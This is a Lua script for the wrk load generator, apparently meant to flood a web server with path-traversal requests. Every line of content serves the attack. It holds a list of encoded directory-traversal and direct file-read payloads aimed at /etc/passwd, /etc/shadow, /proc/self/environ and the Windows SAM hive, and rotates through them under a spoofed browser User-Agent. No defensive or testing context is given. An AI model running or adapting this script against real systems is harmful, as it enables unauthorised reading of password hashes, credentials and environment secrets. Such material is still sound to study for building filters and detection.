local payloads = {
  "/files/../../../etc/passwd",
  "/download?file=....//....//etc/passwd",
  "/static/..%2f..%2f..%2fetc%2fpasswd",
  "/view?path=..%252f..%252f..%252fetc/passwd",
  "/api/read?file=/etc/shadow",
  "/doc?name=../../../proc/self/environ",
  "/backup?dir=..\\..\\..\\windows\\system32\\config\\sam",
  "/resource?p=....\\/....\\/etc/passwd"
}
local counter = 0

request = function()
  counter = counter + 1
  local path = payloads[(counter % #payloads) + 1]
  return wrk.format("GET", path, {
    ["User-Agent"] = "Mozilla/5.0"
  })
end
